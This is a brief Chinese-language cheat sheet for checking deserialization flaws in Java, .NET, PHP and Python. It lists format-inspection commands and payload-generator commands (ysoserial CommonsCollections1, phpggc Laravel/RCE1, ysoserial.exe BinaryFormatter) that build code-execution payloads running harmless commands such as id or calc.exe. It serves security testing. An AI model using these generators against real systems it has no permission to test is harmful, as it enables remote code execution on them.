# 反序列化检查工具链

反序列化问题常见于 Java、.NET、PHP 和 Python 生态。工具只是入口，关键是确认格式、依赖版本、可达 gadget 和触发点。

## 格式识别

```bash
file payload.bin
```

```bash
xxd -l 32 payload.bin
```

```bash
strings payload.bin | head
```

## Java 与 PHP

```bash
java -jar ysoserial.jar CommonsCollections1 'id'
```

```bash
phpggc -l
```

```bash
phpggc Laravel/RCE1 system id
```

## .NET 与 Python

```bash
ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c calc.exe
```

```bash
python3 -m pickletools payload.pickle
```

小记录：反序列化验证要记录入口参数、编码层、服务端框架和依赖线索。不要只保存 payload，触发请求同样重要。
